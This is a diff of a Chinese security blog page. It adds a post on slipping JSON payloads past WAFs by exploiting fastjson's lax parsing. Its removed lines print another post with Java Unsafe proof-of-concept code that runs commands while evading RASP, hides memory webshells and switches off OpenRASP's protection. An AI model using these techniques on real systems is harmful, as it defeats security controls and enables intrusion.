@@ -20,30 +20,35 @@
     var CONFIG = {"hostname":"g1asssy.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="Security&amp;Development.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Glassy@Amadeus&#39;s Zone">
-<meta property="og:url" content="https://g1asssy.com/index.html">
+  <meta name="description" content="引言安全防护产品在进行防护的时候是需要对流量中的数据进行处理的，同样，被攻击的应用也需要处理这些数据以保证业务的正常进行，然而在很多情况下，安全产品处理数据流的框架和应用处理数据流的框架往往不同，在针对常规数据方面，当然不会出现问题，然而一旦被防护应用的数据处理框架的兼容性大于安全产品数据处理框架的兼容性，那么就会出现这么一种情形：攻击者提交的数据被应用正常解析，而安全产品解析失败，这样恶意的流量">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防tricks-通过兼容性差异突破安全防护">
+<meta property="og:url" content="https://g1asssy.com/2022/03/11/fuzz/index.html">
 <meta property="og:site_name" content="Glassy@Amadeus&#39;s Zone">
-<meta property="og:description" content="Security&amp;Development.">
+<meta property="og:description" content="引言安全防护产品在进行防护的时候是需要对流量中的数据进行处理的，同样，被攻击的应用也需要处理这些数据以保证业务的正常进行，然而在很多情况下，安全产品处理数据流的框架和应用处理数据流的框架往往不同，在针对常规数据方面，当然不会出现问题，然而一旦被防护应用的数据处理框架的兼容性大于安全产品数据处理框架的兼容性，那么就会出现这么一种情形：攻击者提交的数据被应用正常解析，而安全产品解析失败，这样恶意的流量">
 <meta property="og:locale">
+<meta property="article:published_time" content="2022-03-11T07:53:04.000Z">
+<meta property="article:modified_time" content="2022-03-11T09:29:00.958Z">
 <meta property="article:author" content="Glassy@Amadeus">
+<meta property="article:tag" content="WAF">
+<meta property="article:tag" content="fastjson">
+<meta property="article:tag" content="byPass">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="https://g1asssy.com/">
+<link rel="canonical" href="https://g1asssy.com/2022/03/11/fuzz/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-Hans'
   };
 </script>
 
-  <title>Glassy@Amadeus's Zone</title>
+  <title>攻防tricks-通过兼容性差异突破安全防护 | Glassy@Amadeus's Zone</title>
   
 
 
@@ -157,9 +162,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
@@ -175,10 +181,9 @@
       <meta itemprop="name" content="Glassy@Amadeus's Zone">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/11/fuzz/" class="post-title-link" itemprop="url">攻防tricks-通过兼容性差异突破安全防护</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          攻防tricks-通过兼容性差异突破安全防护
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -211,7 +216,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>安全防护产品在进行防护的时候是需要对流量中的数据进行处理的，同样，被攻击的应用也需要处理这些数据以保证业务的正常进行，然而在很多情况下，安全产品处理数据流的框架和应用处理数据流的框架往往不同，在针对常规数据方面，当然不会出现问题，然而一旦被防护应用的数据处理框架的兼容性大于安全产品数据处理框架的兼容性，那么就会出现这么一种情形：攻击者提交的数据被应用正常解析，而安全产品解析失败，这样恶意的流量就会成功绕过安全产品进入被攻击的应用。因此寻求目标机器与安全防护产品在数据处理能力上的兼容性差异便会成为突破安全产品的一种卓尔有效的手段。</p>
+        <h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>安全防护产品在进行防护的时候是需要对流量中的数据进行处理的，同样，被攻击的应用也需要处理这些数据以保证业务的正常进行，然而在很多情况下，安全产品处理数据流的框架和应用处理数据流的框架往往不同，在针对常规数据方面，当然不会出现问题，然而一旦被防护应用的数据处理框架的兼容性大于安全产品数据处理框架的兼容性，那么就会出现这么一种情形：攻击者提交的数据被应用正常解析，而安全产品解析失败，这样恶意的流量就会成功绕过安全产品进入被攻击的应用。因此寻求目标机器与安全防护产品在数据处理能力上的兼容性差异便会成为突破安全产品的一种卓尔有效的手段。</p>
 <h2 id="实战讲解"><a href="#实战讲解" class="headerlink" title="实战讲解"></a>实战讲解</h2><h3 id="基于json解析兼容性的示例"><a href="#基于json解析兼容性的示例" class="headerlink" title="基于json解析兼容性的示例"></a>基于json解析兼容性的示例</h3><p>以Java为例，现阶段市面上主流的处理json字符串的框架有fastjson、gson、jackson三种。常见的WAF为了保证对于各种语言开发应用的兼容性，一般会使用自写的json解析器。由于笔者在进行fuzz的过程中发现，gson和jackson在兼容性方面几乎没有任何差异，猜测这两种框架对于json数据的兼容应该代表着主流json解析器的能力，而fastjson在我的印象中一向拥有更强大的兼容性，所以产生想法，是否可以在一段正常的json数据中各个位置插入不同的字符使得gson(它代表着主流gson解析器)进行json解析时候报错，而fastjson能够正常解析，那么在对应用进行攻击的时候，一旦发现应用使用了fastjson框架，便能构造出WAF认不出来但应用可以认出来的数据，从而突破WAF的防御，代码思路如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、写一个正常的json字符串。</span><br><span class="line">2、在它的各种位置尝试插入 1-65535 中的每个字符，生产一个非常规json。</span><br><span class="line">3、将非常规json交给gson处理，报错。</span><br><span class="line">4、交给fastjson处理，正常，将该json记录下来。</span><br></pre></td></tr></table></figure>
 <p>核心代码如下</p>
@@ -233,118 +238,35 @@
 <p>同样通过异形字的变形，无论在反序列的的利用上还是sql注入的利用上绕过安全产品都可以取得一个比较不错的效果。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过兼容性突破安全产品的思路和场景当然远不止这些，我相信在类似于xml解析中可能也会存在类似问题，文章权当是抛砖引玉引出一种思路，欢迎优秀的白帽子们深入探索，末尾给出本次试验中的<a target="_blank" rel="noopener" href="https://github.com/GlassyAmadeus/FuzzProject/tree/main">项目代码</a>方便各位调试，查看结果。</p>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/WAF/" rel="tag"># WAF</a>
+              <a href="/tags/fastjson/" rel="tag"># fastjson</a>
+              <a href="/tags/byPass/" rel="tag"># byPass</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://g1asssy.com/2021/12/09/unsafe/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/glassyAmadeus.jpeg">
-      <meta itemprop="name" content="Glassy@Amadeus">
-      <meta itemprop="description" content="Security&Development.">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Glassy@Amadeus's Zone">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/09/unsafe/" class="post-title-link" itemprop="url">内存级别攻防利器-UnSafe的各种利用姿势</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-12-09 15:53:04 / Modified: 17:03:04" itemprop="dateCreated datePublished" datetime="2021-12-09T15:53:04+08:00">2021-12-09</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">应用安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="UnSafe简介"><a href="#UnSafe简介" class="headerlink" title="UnSafe简介"></a>UnSafe简介</h2><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p>java和C语言相比有一个很大的区别，便是java没有指针，无需进行内存空间的操作（其中包含了内存的分配、内存的回收等等），这样大大简化了Java语言编写的难度，但与此同时，也导致Java语言失去了很多的灵活性。而UnSafe类的出现，便是为了弥补这种便利性的缺失，使Java也具备内存管理能力，但一旦操作不当，很容易造成内存泄漏等问题，这也是这个class给定义为UnSafe的原因。</p>
-<h3 id="关键API"><a href="#关键API" class="headerlink" title="关键API"></a>关键API</h3><p>下面给出的是笔者觉得比较好用的利用的API。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将引用值存储到给定的Java变量中，根据变量的类型不同还有putBoolean、putInt等等</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">putObject</span><span class="params">(Object o, <span class="keyword">long</span> offset, Object x)</span></span>;</span><br><span class="line"><span class="comment">//返回给定的非静态属性在它的类的存储分配中的位置，往往和putXXX一起使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">long</span> <span class="title">objectFieldOffset</span><span class="params">(Field f)</span></span>;</span><br><span class="line"><span class="comment">//返回给定的静态属性在它的类的存储分配中的位置，往往和putXXX一起使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">long</span> <span class="title">staticFieldOffset</span><span class="params">(Field f)</span></span>;</span><br><span class="line"><span class="comment">//生产VM Anonymous Class，注意这个java中常说的匿名类并不是同一概念，该方法的出现是为了为java提供动态编译特性，在Lambda表达式代码中使用较多，由该函数生产的Class有一个很重要的特性：这个类被创建之后并不会丢到上SystemDictonary里，也就是说我们通过正常的类查找，比如Class.forName等api是无法去查到这个类是否被定义过的。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> Class&lt;?&gt; defineAnonymousClass(Class&lt;?&gt; hostClass, <span class="keyword">byte</span>[] data, Object[] cpPatches);</span><br><span class="line"><span class="comment">//通过Class对象创建一个类的实例，不需要调用其构造函数、初始化代码、JVM安全检查等等。同时，它抑制修饰符检测，也就是即使构造器是private修饰的也能通过此方法实例化。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> Object <span class="title">allocateInstance</span><span class="params">(Class&lt;?&gt; cls)</span> <span class="keyword">throws</span> InstantiationException</span>;</span><br></pre></td></tr></table></figure>
-
-<h3 id="如何获取UnSafe"><a href="#如何获取UnSafe" class="headerlink" title="如何获取UnSafe"></a>如何获取UnSafe</h3><p>Unsafe类使用了单例模式，需要通过一个静态方法getUnsafe()来获取。但Unsafe类做了限制，如果是普通的调用的话，它会抛出一个SecurityException异常；只有由主类加载器加载的类才能调用这个方法。</p>
-<p>目前大部分UnSafe的使用者都会使用反射的方式来获取UnSafe的实例，代码如下：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Unsafe <span class="title">getUnsafe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Unsafe unsafe = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field field = Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            unsafe = (Unsafe) field.get(<span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> unsafe;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-<h2 id="实战讲解"><a href="#实战讲解" class="headerlink" title="实战讲解"></a>实战讲解</h2><h3 id="更深层的命令执行"><a href="#更深层的命令执行" class="headerlink" title="更深层的命令执行"></a>更深层的命令执行</h3><p>随着RASP的发展，JNI的利用不断的被提上讨论范围，就命令执行这种利用而言，外部流出的大部分JNI的利用都是需要依赖第三方库的，但实际上，就linux来看，<em><strong>Runtime.getRuntime().exec()</strong></em> 本身的最底层就是一个JNI函数，</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">forkAndExec</span><span class="params">(<span class="keyword">int</span> mode, <span class="keyword">byte</span>[] helperpath,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">byte</span>[] prog,<span class="keyword">byte</span>[] argBlock, <span class="keyword">int</span> argc,<span class="keyword">byte</span>[] envBlock, <span class="keyword">int</span> envc,<span class="keyword">byte</span>[] dir,<span class="keyword">int</span>[] fds,<span class="keyword">boolean</span> redirectErrorStream)</span></span></span><br></pre></td></tr></table></figure>
-<p>那么为什么我们讨论JNI利用的时候，不去直接反射调用forkAndExec函数呢，很重要的一个问题就是，<em><strong>这个函数不是静态方法，需要生成类实例</strong></em>，我们就需要往上层去调用UNIXProcess的构造方法去生成实例，而这样这种利用方式便不再是JNI的调用了，因为你调用了JAVA层的构造函数，这便是RASP产品可以触及到的领域了，细心观察也能发现目前大部分RASP产品都把命令执行功能的检测放到了UNIXProcess的构造方法上。</p>
-<p>但是有了UnSafe的allocateInstance函数，一切就会变得简单起来，它可以在不调用UNIXProcess构造方法的前提下生成实例，并且由于allocateInstance本身也是native函数，那么实际上我们整个命令执行的关键点上都是通过JNI来完成了，可以完美避开RASP的防御，下面给出代码示例，</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">String cmd = <span class="string">&quot;open /System/Applications/Calculator.app/&quot;</span>;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">int</span>[] ineEmpty = &#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">Unsafe unsafe = Utils.getUnsafe();</span><br><span class="line">Object obj = unsafe.allocateInstance(clazz);</span><br><span class="line">Field helperpath = clazz.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">helperpath.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object path = helperpath.get(obj);</span><br><span class="line"><span class="keyword">byte</span>[] prog = <span class="string">&quot;/bin/bash\u0000&quot;</span>.getBytes();</span><br><span class="line">String paramCmd = <span class="string">&quot;-c\u0000&quot;</span> + cmd + <span class="string">&quot;\u0000&quot;</span>;</span><br><span class="line"><span class="keyword">byte</span>[] argBlock = paramCmd.getBytes();</span><br><span class="line"><span class="keyword">int</span> argc = <span class="number">2</span>;</span><br><span class="line">Method exec = clazz.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="keyword">int</span>.class, <span class="keyword">byte</span>[].class, <span class="keyword">byte</span>[].class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">exec.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">exec.invoke(obj, <span class="number">2</span>, path, prog, argBlock, argc, <span class="keyword">null</span>, <span class="number">0</span>, <span class="keyword">null</span>, ineEmpty, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
-<h3 id="更隐蔽的内存马"><a href="#更隐蔽的内存马" class="headerlink" title="更隐蔽的内存马"></a>更隐蔽的内存马</h3><p>内存马问题一向是安全产品中一个比较头疼的问题，一旦再在通信流量上进行了加密处理，那么无论是WAF（加密流量不可解）还是主机防御（木马存在于内存中不落盘）产品都比较难以去发现它。</p>
-<p>但随着安全圈大佬们的深入研究，渐渐还是给出了一个较为可行的方案：通过Java Instrumentation进入到JVM内存之中，对JVM所有的加载的可能是木马的Class进行分析，一旦匹配到了较为明显的内存马特征，便对内存中的这个Class进行删除或则还原。目前比较常见的内存马特征有以下几种：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、class的名字是否包含常见的恶意类名称</span><br><span class="line">2、加载该class的classloader是否是危险的classloader，如TransletClassLoader或apache becl的classloader等等。</span><br><span class="line">3、该class是否有落盘  -----该条属于明显特征</span><br><span class="line">4、class中是否包含命令执行的恶意代码</span><br></pre></td></tr></table></figure>
-<p>而通过defineAnonymousClass生成的VM Anonymous Class具备如下特征：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、class名可以是已存在的class的名字，比如java.lang.File，即使如此也不会发生任何问题，java的动态编译特性将会在内存中生成名如 java.lang.File/13063602@38ed5306的class。  ---将会使类名极具欺骗性</span><br><span class="line">2、该class的classloader为null。  ---在java中classloader为null的为来自BootstrapClassLoader的class，往往会被认定为jdk自带class</span><br><span class="line">3、在JVM中存在大量动态编译产生的class（多为lamada表达式生成），这种class均不会落盘，所以不落盘并不会属于异常特征。 </span><br><span class="line">4、无法通过Class.forName()获取到该class的相关内容。 ---严重影响通过反射排查该类安全性的检测工具</span><br><span class="line">5、在部分jdk版本中，VM Anonymous Class甚至无法进行restransform。 ---这也就意味着我们无法通过attach API去修复这个恶意类</span><br><span class="line">6、该class在transform中的className将会是它的模板类名。 ---这将会对那些通过attach方式检测内存马的工具造成极大的误导性</span><br></pre></td></tr></table></figure>
-<img src="/2021/12/09/unsafe/transform.png" class="" title="transform">
-<p>从现阶段内存马的检测模式为参考，可以发现VM Anonymous Class的特性将会大大影响到它的检测，从而形成更加隐蔽且难以处理的内存马。下面给出一段生成VM Anonymous Class的示例代码，</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass ctClass = pool.makeClass(<span class="string">&quot;java.lang.File&quot;</span>);</span><br><span class="line">        <span class="comment">//这里可以对内存马的class文件进行定制</span></span><br><span class="line">        <span class="keyword">byte</span>[] data = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        Class memClass = getAnonymousMemShell(data);</span><br><span class="line">        Object memShellObj = memClass.newInstance();</span><br><span class="line">        <span class="comment">//在这里可以把内存马的实例注入到内存中</span></span><br><span class="line"></span><br><span class="line">        String className = memClass.getName();</span><br><span class="line">        <span class="comment">//可以打印一下className，发现其类名极具欺骗性</span></span><br><span class="line">        System.out.println(className);</span><br><span class="line">        <span class="comment">//这里可以通过Class.forName尝试查找匿名类,会抛出异常</span></span><br><span class="line">        Class.forName(className);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Class <span class="title">getAnonymousMemShell</span><span class="params">(<span class="keyword">byte</span>[] data)</span></span>&#123;</span><br><span class="line">        Unsafe unsafe = Utils.getUnsafe();</span><br><span class="line">        <span class="keyword">return</span> unsafe.defineAnonymousClass(File.class, data, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="突破反射防御机制"><a href="#突破反射防御机制" class="headerlink" title="突破反射防御机制"></a>突破反射防御机制</h3><p>近段时间，RASP攻防开始被不断聊起，关于RASP攻防，有一个基于反射的利用方式的提出具备十分强的杀伤性，其基本思路便是一旦攻击者拿到了一个代码执行权限，那么他便可以通过反射的方式取得RASP运行在内存中的开关变量（多为boolean或者AtomicBoolean类型），并把它由true修改为false，就可以使RASP得的防护完全失效。<em><strong>注意，开关变量只是其中一个最具代表性的思路，我们当然有更多的方法去破坏RASP的运行模式，如置空检测逻辑代码（如果RASP使用了js、lua等别的引擎），置空黑名单、添加白名单等</strong></em></p>
-<p>正是由于反射可能会造成较大的危害，不少RASP便有了恶意反射调用模块，jdk本身也有一个sun.reflect.Reflection来限制一些不安全的反射的调用，那么这个时候UnSafe模块便可以通过直接操作内存从而绕过代码层对于恶意反射调用的防御。示例代码如下，</p>
-<p>反射修改openRASP的开关变量，将openRASP检测开关置为false，从而使openRASP完全失效。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class clazz = Class.forName(<span class="string">&quot;com.baidu.openrasp.HookHandler&quot;</span>);</span><br><span class="line">    Unsafe unsafe = getUnsafe();</span><br><span class="line">    InputStream inputStream = clazz.getResourceAsStream(clazz.getSimpleName() + <span class="string">&quot;.class&quot;</span>);</span><br><span class="line">    <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[inputStream.available()];</span><br><span class="line">    inputStream.read(data);</span><br><span class="line">    Class anonymousClass = unsafe.defineAnonymousClass(clazz, data, <span class="keyword">null</span>);</span><br><span class="line">    Field field = anonymousClass.getDeclaredField(<span class="string">&quot;enableHook&quot;</span>);</span><br><span class="line">    unsafe.putObject(clazz, unsafe.staticFieldOffset(field), <span class="keyword">new</span> AtomicBoolean(<span class="keyword">false</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由于UnSafe的大部分关键操作都是直接通过JNI去实现的，所以UnSafe的相关危险行为也都是RASP难以防护到的。而UnSafe相关的攻击代码目前也比较少，相关函数的指纹也不在大部分内容检测软件中，所以现阶段对于不少主机防御产品也能起到不小的作用。</p>
-<p>最后在末尾附上一张UnSafe功能介绍图。</p>
-<img src="/2021/12/09/unsafe/unsafe.png" class="" title="unsafe">
-<p><em><strong>注：该图片系网上找的，未能发现图片源头，在此提前和作者道个歉。</strong></em></p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/09/unsafe/" rel="prev" title="内存级别攻防利器-UnSafe的各种利用姿势">
+      <i class="fa fa-chevron-left"></i> 内存级别攻防利器-UnSafe的各种利用姿势
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
@@ -397,6 +319,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E8%AE%B2%E8%A7%A3"><span class="nav-number">2.</span> <span class="nav-text">实战讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8Ejson%E8%A7%A3%E6%9E%90%E5%85%BC%E5%AE%B9%E6%80%A7%E7%9A%84%E7%A4%BA%E4%BE%8B"><span class="nav-number">2.1.</span> <span class="nav-text">基于json解析兼容性的示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%95%B0%E5%AD%97%E5%AD%97%E7%AC%A6%E5%85%BC%E5%AE%B9%E6%80%A7%E7%9A%84%E7%A4%BA%E4%BE%8B"><span class="nav-number">2.2.</span> <span class="nav-text">基于数字字符兼容性的示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
